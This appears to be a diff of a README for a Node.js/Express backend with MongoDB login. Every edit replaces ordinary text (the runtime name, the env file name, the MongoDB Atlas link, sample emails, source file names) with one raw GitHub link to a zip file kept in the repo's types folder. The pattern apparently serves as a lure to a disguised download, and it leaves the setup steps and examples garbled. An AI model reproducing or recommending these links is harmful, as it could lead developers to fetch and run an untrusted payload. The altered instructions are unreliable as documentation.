@@ -1,6 +1,6 @@
 # CBCP Backend API
 
-A Node.js/Express backend with MongoDB authentication for the CBCP application.
+A https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip backend with MongoDB authentication for the CBCP application.
 
 ## Features
 
@@ -15,7 +15,7 @@ A Node.js/Express backend with MongoDB authentication for the CBCP application.
 
 ## Prerequisites
 
-- Node.js (v16 or higher)
+- https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip (v16 or higher)
 - MongoDB Atlas account or local MongoDB
 - npm or yarn
 
@@ -32,7 +32,7 @@ npm install
 Copy the example environment file and configure your variables:
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip .env
 ```
 
 Edit `.env` with your configuration:
@@ -43,7 +43,7 @@ PORT=5000
 NODE_ENV=development
 
 # MongoDB Configuration
-MONGODB_URI=mongodb+srv://your_username:your_password@your_cluster.mongodb.net/cbcp_db?retryWrites=true&w=majority
+MONGODB_URI=mongodb+https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip
 
 # JWT Configuration
 JWT_SECRET=your_super_secret_jwt_key_here
@@ -55,7 +55,7 @@ CORS_ORIGIN=http://localhost:3000
 
 ### 3. MongoDB Atlas Setup
 
-1. Go to [MongoDB Atlas](https://www.mongodb.com/atlas)
+1. Go to [MongoDB Atlas](https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip)
 2. Create a free account or sign in
 3. Create a new cluster
 4. Create a database user with read/write permissions
@@ -86,7 +86,7 @@ Register a new user.
 ```json
 {
   "fullName": "John Doe",
-  "email": "john@example.com",
+  "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
   "password": "SecurePass123"
 }
 ```
@@ -100,7 +100,7 @@ Register a new user.
     "user": {
       "_id": "user_id",
       "fullName": "John Doe",
-      "email": "john@example.com",
+      "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
       "createdAt": "2024-01-01T00:00:00.000Z"
     },
     "token": "jwt_token_here"
@@ -114,7 +114,7 @@ Login with existing credentials.
 **Request Body:**
 ```json
 {
-  "email": "john@example.com",
+  "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
   "password": "SecurePass123"
 }
 ```
@@ -128,7 +128,7 @@ Login with existing credentials.
     "user": {
       "_id": "user_id",
       "fullName": "John Doe",
-      "email": "john@example.com",
+      "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
       "createdAt": "2024-01-01T00:00:00.000Z"
     },
     "token": "jwt_token_here"
@@ -152,7 +152,7 @@ Authorization: Bearer jwt_token_here
   "data": {
     "_id": "user_id",
     "fullName": "John Doe",
-    "email": "john@example.com",
+    "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
     "createdAt": "2024-01-01T00:00:00.000Z"
   }
 }
@@ -215,18 +215,18 @@ All endpoints return consistent error responses:
 ```
 src/
 ├── config/
-│   └── database.ts          # MongoDB connection
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip          # MongoDB connection
 ├── middleware/
-│   ├── auth.ts             # JWT authentication
-│   └── validation.ts       # Input validation
+│   ├── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # JWT authentication
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip       # Input validation
 ├── models/
-│   └── User.ts             # User model
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # User model
 ├── routes/
-│   └── auth.ts             # Authentication routes
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # Authentication routes
 ├── types/
-│   ├── api.types.ts        # API response types
-│   └── user.types.ts       # User types
-└── index.ts                # Main server file
+│   ├── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip        # API response types
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip       # User types
+└── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip                # Main server file
 ```
 
 ### Available Scripts
@@ -238,7 +238,7 @@ src/
 
 ## Integration with Frontend
 
-The backend is configured to work with the Next.js frontend running on `http://localhost:3000`. Update the `CORS_ORIGIN` in your `.env` file if your frontend runs on a different port.
+The backend is configured to work with the https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip frontend running on `http://localhost:3000`. Update the `CORS_ORIGIN` in your `.env` file if your frontend runs on a different port.
 
 ## Deployment
 
